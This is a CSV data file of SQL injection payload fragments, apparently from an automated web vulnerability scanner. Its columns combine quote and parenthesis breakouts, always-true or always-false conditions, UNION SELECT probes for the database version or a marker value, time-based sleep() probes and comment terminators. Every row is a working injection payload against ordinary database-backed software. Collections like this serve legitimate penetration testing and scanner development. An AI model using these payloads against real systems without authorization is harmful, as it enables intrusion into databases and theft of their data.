fu_1,fu_2,fu_3,fu_4
',,,#
\",,,#
\",or 1=0,union select version(),-- -
\",or 1=0,union select 31333337,-- -
)\",or false,union select sleep(TIMEOUT_SLEEP),-- -
',or 1>2,"union select null,version()",-- -
',or 1>2,"union select null,31333337",-- -
'),or 1<2,"union select null,sleep(TIMEOUT_SLEEP)",-- - -
\",or 1=2,"union select null,null,version()",-- - -
\",or 1=2,"union select null,null,31333337",-- - -
'),and 2=1,"union select null,null,sleep(TIMEOUT_SLEEP)",# #
\")",or 3=3,"union select null,null,null,version()",##
\")",or 3=3,"union select null,null,null,31333337",##
\",or 'a' = 'a',"union select null,null,null,sleep(TIMEOUT_SLEEP)",-- - - -
',or 'a' = 'b',"union select null,null,null,null,version()",-- - - -
',or 'a' = 'b',"union select null,null,null,null,31333337",-- - - -
',and 1=1,"union select null,null,null,null,sleep(TIMEOUT_SLEEP)",-- - -